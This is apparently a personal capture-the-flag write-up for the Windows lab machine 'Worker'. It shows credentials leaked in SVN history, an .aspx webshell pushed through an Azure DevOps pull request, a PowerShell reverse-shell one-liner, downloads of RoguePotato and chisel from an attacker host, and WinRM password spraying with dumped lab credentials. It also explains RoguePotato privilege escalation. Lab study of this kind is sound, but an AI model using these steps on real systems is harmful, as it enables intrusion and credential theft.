**Worker** is a **medium-difficulty** Windows machine that focuses on **software development environments** and **Azure DevOps pipeline abuse**.

## Azure DevOps, CI/CD, and Pipelines
**Azure DevOps** is a cloud-based or on-premises platform by **Microsoft** that provides **tools for software development, version control, and automation**.  
🔹 It helps teams **write, test, and deploy code automatically** using **CI/CD pipelines**.  
🔹 Developers use Azure DevOps to **manage projects, store source code, and automate builds and deployments**.

💡 Think of it as **GitHub + Jenkins + Task Management**, all in one system

---
CI/CD stands for:  
✅ **Continuous Integration (CI)** – Automatically testing and building code changes whenever developers push new code.  
✅ **Continuous Deployment (CD)** – Automatically deploying the tested code to a live environment.

💡 The goal is to **automate the software development and release process** so that updates happen **quickly and without errors**

---
## **What is a Pipeline?**

A **pipeline** is a series of **steps that automate tasks** in software development.

🔹 It takes code from a **repository (like SVN or Git)** → builds it → tests it → deploys it.  
🔹 Pipelines are defined in **YAML files** (configuration files that describe the automation steps).  
🔹 Pipelines **run on an agent** (a server or VM that executes the steps).
**Subversion**. It is a centralized version control system distributed under an open-source Apache license. SVN allows multiple developers to have the current and recent versions of data, such as source files, in sync. It keeps track of every change users make on files.

---

## How Can Azure DevOps Be Exploited?
### **Misconfigured Pipelines**

- If a pipeline **executes commands without restriction**, attackers can inject **malicious code** to run as a privileged user.

### **🟢 Leaked Credentials in Source Code**

- Developers may accidentally store **passwords, API keys, or tokens** inside repositories.

### **🟢 Abusing Build Agents**

- **Build agents** (machines running the pipeline) can be misconfigured to execute **unauthorized system commands**.
- Attackers can exploit **privilege escalation flaws** in these agents to gain admin or SYSTEM access.

### **🟢 SVN Server Exposure**

- If the **SVN server** is exposed, an attacker can extract source code, find **sensitive information**, and use it to infiltrate Azure DevOps.

---
A **branch** in version control systems (like Git or SVN) is a **separate line of development** that allows multiple developers to work on different features **without affecting the main codebase**.

#### **Master Branch (or Main Branch)**

🔹 The **master branch** (now often called **main** in newer Git versions) is the **primary, stable branch** of a repository.  
🔹 It contains **the official version** of the code that is deployed or ready for production.  
🔹 All new features or bug fixes are typically **developed in separate branches**, tested, and then merged back into the **master branch**.

---

## Enumeration
IP= 10.10.10.203
```bash
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3690/tcp open  svnserve Subversion
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
---
winrm on 5985

```
-check website port 80 , iis blank page
### **Port 3690/tcp Open – svnserve (Subversion Server) Detected**

🔹 **Port 3690 (TCP)** is the default port for **svnserve**, which is the **Subversion (SVN) server** process.  
🔹 **Subversion (SVN)** is a **version control system** used for managing code repositories, similar to Git.  
🔹 When this port is open, it means the server is **hosting an SVN repository**, and it might be accessible remotely.
```bash
svn -h
svn ls svn://10.10.10.203
┌──(pwn㉿kali)-[~]
└─$ svn ls svn://10.10.10.203
dimension.worker.htb/
moved.txt

┌──(pwn㉿kali)-[~]
└─$ svn log svn://10.10.10.203

r5 | nathen 


┌──(pwn㉿kali)-[~]
└─$ cat moved.txt        
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb


```
-/etc/hosts add domains
-check http://dimension.worker.htb/#work 
-subdomains ??
```bash
┌──(pwn㉿kali)-[~]
└─$ curl http://dimension.worker.htb/#work -s -q | grep -o http://.*.worker.htb
http://alpha.worker.htb
http://cartoon.worker.htb
http://lens.worker.htb
http://solid-state.worker.htb
http://spectral.worker.htb
http://story.worker.htb

```

```bash
┌──(pwn㉿kali)-[~]
└─$ cat /etc/hosts                                                             
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.203    dimension.worker.htb
10.10.10.203    devops.worker.htb
10.10.10.203    alpha.worker.htb
10.10.10.203    cartoon.worker.htb
10.10.10.203    lens.worker.htb
10.10.10.203    solid-state.worker.htb
10.10.10.203    spectral.worker.htb
10.10.10.203    story.worker.htb

```
-good approach is to do gobuster vhost 
```bash
┌──(pwn㉿kali)-[~/svn]
└─$ ls
dimension.worker.htb  moved.txt
                                                                                                                  
┌──(pwn㉿kali)-[~/svn]
└─$ svn up -r 2                    
Updating '.':
D    moved.txt
A    deploy.ps1
Updated to revision 2.

┌──(pwn㉿kali)-[~/svn]
└─$ ls
deploy.ps1  dimension.worker.htb                                                    
┌──(pwn㉿kali)-[~/svn]
└─$ cat  deploy.ps1 
$user = "nathen" 
$plain = "wendel98"
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")

```
`nathen : wendel98`
```bash
┌──(pwn㉿kali)-[~/svn]
└─$ svn checkout svn://10.10.10.203
A    dimension.worker.htb/
A    moved.txt
Checked out revision 5.

```
-the newest version is 5 but i went back to se repository in previous
version 2,3,4
-cred founded
```
┌──(pwn㉿kali)-[~/svn]
└─$ cat moved.txt  
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

go to http://devops.worker.htb
enter cred , we are in!!

```
![[Pasted image 20250209091358.png]]

-its windows web server maybe .aspx revshell works
- lets clone repo in the website
-**Cloning** means making a **full copy** of a repository (codebase) from a remote server onto your local machine.
https://github.com/tennc/webshell?tab=readme-ov-file
```bash
$ git clone http://devops.worker.htb/ekenas/SmartHotel360/_git/spectral

```

```bash
┌──(pwn㉿kali)-[~/svn/cloned/spectral]
└─$ git branch ahmad
                                                                                                                  
┌──(pwn㉿kali)-[~/svn/cloned/spectral]
└─$ ls
assets  cmdasp.aspx  elements.html  generic.html  images  index.html  LICENSE.txt  README.txt
                                                                                                                  
┌──(pwn㉿kali)-[~/svn/cloned/spectral]
└─$ git checkout ahmad                                                   
Switched to branch 'ahmad'
                                                                                                                  
┌──(pwn㉿kali)-[~/svn/cloned/spectral]
└─$ git push          
fatal: The current branch ahmad has no upstream branch.
To push the current branch and set the remote as upstream, use

    git push --set-upstream origin ahmad

To have this happen automatically for branches without a tracking
upstream, see 'push.autoSetupRemote' in 'git help config'.

                                                                                                                  
┌──(pwn㉿kali)-[~/svn/cloned/spectral]
└─$ git push --set-upstream origin ahmad
Username for 'http://devops.worker.htb': nathen
Password for 'http://nathen@devops.worker.htb': 
Total 0 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
To http://devops.worker.htb/ekenas/SmartHotel360/_git/spectral
 * [new branch]      ahmad -> ahmad
branch 'ahmad' set up to track 'origin/ahmad'.


```

```bash
┌──(pwn㉿kali)-[~/svn/cloned/spectral]
└─$ git push --set-upstream origin ahmad
Username for 'http://devops.worker.htb': nathen
Password for 'http://nathen@devops.worker.htb': 
Total 0 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
To http://devops.worker.htb/ekenas/SmartHotel360/_git/spectral
 * [new branch]      ahmad -> ahmad
branch 'ahmad' set up to track 'origin/ahmad'.
                                                                                                                  
┌──(pwn㉿kali)-[~/svn/cloned/spectral]
└─$ git checkout ahmad
A       cmdasp.aspx
Already on 'ahmad'
Your branch is up to date with 'origin/ahmad'.
                                                                                                                  
┌──(pwn㉿kali)-[~/svn/cloned/spectral]
└─$ git commit -m "added some normal file dont panic" 
Author identity unknown

*** Please tell me who you are.

Run

  git config --global user.email "you@example.com"
  git config --global user.name "Your Name"

to set your account's default identity.
Omit --global to set the identity only in this repository.

fatal: unable to auto-detect email address (got 'pwn@kali.(none)')
                                                                                                                  
┌──(pwn㉿kali)-[~/svn/cloned/spectral]
└─$ git push origin ahmad
Username for 'http://devops.worker.htb': nathen
Password for 'http://nathen@devops.worker.htb': 
Everything up-to-date
                                                                                                                  
┌──(pwn㉿kali)-[~/svn/cloned/spectral]
└─$ git config --global user.email "you@example.com"
                                                                                                                  
┌──(pwn㉿kali)-[~/svn/cloned/spectral]
└─$ git config --global user.name "Your Name"
                                                                                                                  
┌──(pwn㉿kali)-[~/svn/cloned/spectral]
└─$ git commit -m "added some normal file dont panic" 
[ahmad 2854b87] added some normal file dont panic
 1 file changed, 42 insertions(+)
 create mode 100644 cmdasp.aspx
                                                                                                                  
┌──(pwn㉿kali)-[~/svn/cloned/spectral]
└─$ git push origin ahmad                             
Username for 'http://devops.worker.htb': nathen
Password for 'http://nathen@devops.worker.htb': 
remote: Storing index... done (173 ms)
To http://devops.worker.htb/ekenas/SmartHotel360/_git/spectral
   8a41e08..2854b87  ahmad -> ahmad
                                     
```

![[Pasted image 20250209095207.png]]

![[Pasted image 20250209095908.png]]

![[Pasted image 20250209095938.png]]

![[Pasted image 20250209100020.png]]

it will push our code into master
`Nathalie Henley completed the pull request on 2/9/2025 9:01 AM (just now).`

![[Pasted image 20250209100303.png]]

```bash
──(pwn㉿kali)-[/usr/share/nishang/Shells]
└─$ cp Invoke-PowerShellTcpOneLine.ps1 /home/pwn

## Pre - exploitation
``
```
```txt

┌──(pwn㉿kali)-[~]
└─$ nc -nlvp

in web shell:

`-powershell -Command "Get-Process"`
-powershell -ExecutionPolicy Bypass -Command "Get-Process"
-powershell -ExecutionPolicy Bypass -Command "$client = New--Object System.Net.Sockets.TCPClient('<attacker-ip>', <port>); -$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%-{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne -0) { $data = (New-Object -Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = -(iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS -' + (pwd).Path + '> '; $sendbyte = -([text.encoding]::ASCII).GetBytes($sendback2); -$stream.Write($sendbyte, 0, $sendbyte.Length); -$stream.Flush() }"

---



```

```bash
PS W:\svnrepos\www\conf> dir


    Directory: W:\svnrepos\www\conf


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       2020-06-20     11:29           1112 authz                                                                 
-a----       2020-06-20     11:29            904 hooks-env.tmpl                                                        
-a----       2020-06-20     15:27           1031 passwd                                                                
-a----       2020-04-04     20:51           4454 svnserve.conf                                                         


PS W:\svnrepos\www\conf> 
PS W:\svnrepos\www\conf> type passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday

```
-crackmapexec ??
```bash
┌──(pwn㉿kali)-[~]
└─$ sudo gedit worker.list      
[sudo] password for pwn: 

```
Use `sed` to replace `=` with `:` and remove spaces:

```bash
┌──(pwn㉿kali)-[~]
└─$ sed 's/ = /:/g' worker.list
┌──(pwn㉿kali)-[~]
└─$ awk -F':' '{print $1 > "usernames_.txt"; print $2 > "passwords_.txt"}' worker.list 

```

```bash
┌──(pwn㉿kali)-[~]
└─$ crackmapexec winrm 10.10.10.203 -u usernames_.txt -p passwords_.txt --no-bruteforce --continue-on-success

WINRM       10.10.10.203    5985   NONE             [+] None\robisl:wolves11 (Pwn3d!)



```

## user-exploitation

![[Pasted image 20250209105642.png]]

```bash

in the webshellL
PS W:\svnrepos\www\conf> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```
-`SeImpersonatePrivilege        Impersonate a client after authentication Enabled `

### **Rogue Potato **

`RoguePotato` is a **Windows privilege escalation exploit** that abuses the SeImpersonatePrivilege by manipulating **DCOM activation** and the **NT AUTHORITY\SYSTEM token**.

#### **How Does Rogue Potato Work?**

1. The exploit **tricks the Windows RPC service** into making an NTLM authentication request to a **rogue COM server** controlled by the attacker.
2. The attacker captures this NTLM authentication and relays it to **another privileged service** that accepts authentication via NTLM.
3. This results in obtaining a **SYSTEM-level token**, which can be used to spawn a SYSTEM shell.
```bash
PS C:\windows\temp> wget http://10.10.14.15:80/RoguePotato.exe -o RoguePotato.exe
PS C:\windows\temp> dir
PS C:\windows\temp> .\RoguePotato.exe
ERROR
Socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999
??
		
```

## Post-exploitation
- Some **low-privileged Windows services** (like `Network Service` or `Local Service`) **cannot directly become SYSTEM**, but they **can impersonate SYSTEM** if they receive an authentication token.
- The problem is: **How do we get a SYSTEM token?**
- **Solution**: RoguePotato **tricks Windows into giving us a SYSTEM authentication request that we can hijack.**

---

## **🛠️ Step 2: Abusing Windows DCOM Activation Requests**

Windows uses a **DCOM (Distributed Component Object Model) activation service** that runs under SYSTEM.

- When a **low-privileged service** requests a COM object that requires SYSTEM privileges, **Windows asks SYSTEM to authenticate to the service that requested it**.
- Normally, this authentication goes to **Microsoft’s legitimate service**, but we **redirect it to our malicious listener instead**.

---

## **🛠️ Step 3: The Attack Execution**

1. **Attacker (You) runs RoguePotato**, which:
    - Starts a **malicious RPC/DCOM server** on the victim machine.
    - This server **listens for incoming authentication requests**.
2. **RoguePotato tricks Windows into making a SYSTEM authentication request** by:
    - Asking for a COM object that requires SYSTEM.
    - Intercepting the request and redirecting it to itself instead of Microsoft’s real service.
3. **Windows SYSTEM now unknowingly authenticates to our malicious service** using NTLM authentication.
4. **RoguePotato relays this SYSTEM authentication back to a local RPC service** that allows token impersonation.
5. **Boom! Now we can impersonate SYSTEM** and execute commands as SYSTEM.

-remember the target has
	port 80 + 3690 + 5985  only opened


```bash

┌──(pwn㉿kali)-[~/linux-post-exp]
└─$ ./chisel_1.10.1_linux_amd64               

  Usage: chisel [command] [--help]

  Version: 1.10.1 (go1.23.1)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel

```

```bash
windows


PS C:\windows\temp> wget http://10.10.14.15:8888/chisel.exe -o chisel.exe
PS C:\windows\temp> dir




```

```bash
linux
┌──(pwn㉿kali)-[~/linux-post-exp]
└─$ ./chisel_1.10.1_linux_amd64 server -p 8989 --reverse
2025/02/09 03:36:21 server: Reverse tunnelling enabled
2025/02/09 03:36:21 server: Fingerprint dBdqDM/gWml1i3cxgFeFIxLMIBVcK3r1t0YVI86feB8=
2025/02/09 03:36:21 server: Listening on http://0.0.0.0:8989

```

```bash
\chisel.exe client 10.10.14.15:8989 R:9999:localhost:9999
```

